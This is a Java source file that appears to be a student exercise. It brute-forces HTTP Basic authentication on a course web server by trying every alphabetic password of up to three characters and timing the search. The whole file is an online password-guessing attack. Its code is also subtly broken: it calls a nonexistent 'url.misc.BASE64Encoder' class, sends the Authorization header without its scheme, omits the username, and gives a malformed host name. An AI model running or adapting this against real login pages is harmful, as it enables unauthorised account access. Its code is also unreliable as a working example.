import java.io.*;
import java.net.*;
import java.util.*;


public class BruteForce
{

	public static void main(String args[])
	{
		
		
        Calendar cal = Calendar.getInstance();
        Date now=cal.getTime();
        double startTime = now.getTime();

		String password=getPassword(startTime);
		System.out.println("The password is " + password);
	}

	public static String getPassword(double startTime)
	{
		char first, second, third;
		String password="";
		int requests=0;

		
		for (int i=65; i<123; i++)
		{
			requests++;
			first = (char) i;

			password = first + "";

			
			if (testPassword(password, startTime, requests))
				return password;

			for (int j=65; j<123; j++)
			{
				requests++;
				second = (char) j;

				password = first + "" + second;

				
				if (testPassword(password, startTime, requests))
					return password;

				for (int k=65; k<123; k++)
				{
					requests++;
					third = (char) k;

					password = first + "" + second + "" + third;

					
					if (testPassword(password, startTime, requests))
						return password;


					
					if (k==90)
						k=96;

				}

				if (j==90)
					j=96;

			}

			if (i==90)
				i=96;

		}

		return password;
	}

	private static boolean testPassword(String password, double startTime, int requests)
	{
		try
		{
			
			
			URL url=new URL("http://sec-crack.cs.rmit.edu./SEC/2/");

			HttpURLConnection connection;

    		String userPassword =  ":" + password;

    		
    		String encoding = new url.misc.BASE64Encoder().encode (userPassword.getBytes());

			try
			{
				
				connection = (HttpURLConnection) url.openConnection();
				
				connection.setRequestProperty("Authorization", " " + encoding);

				
				int status=connection.getResponseCode();

				System.out.println(password + requests);

				if (status==200)
				{
					System.out.println("It took " + getTime(startTime) + " milliseconds  find the password.");
					System.out.println(" were " + requests + " requests .");

					return true;
				}

				return false;

			}

			catch (IOException ioe)
			{
				System.out.print(ioe);
				return false;
			}

		}

		catch (IOException MalformedURLException)
		{
			System.out.print("Invalid URL");
			return false;
		}
	}


	private static double getTime(double startTime)
	{
		
		
        Calendar cal = Calendar.getInstance();
        Date now=cal.getTime();
        double endTime = now.getTime();

        return endTime-startTime;

	}

}
